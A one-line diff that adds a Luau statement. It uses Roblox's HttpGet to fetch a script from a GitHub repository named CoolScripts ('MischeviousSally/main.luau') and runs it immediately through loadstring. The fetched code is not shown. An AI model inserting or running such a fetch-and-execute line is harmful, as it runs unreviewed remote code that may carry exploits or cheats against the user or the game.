@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://github.com/gigimoose23/CoolScripts/raw/refs/heads/main/MischeviousSally/main.luau'))()
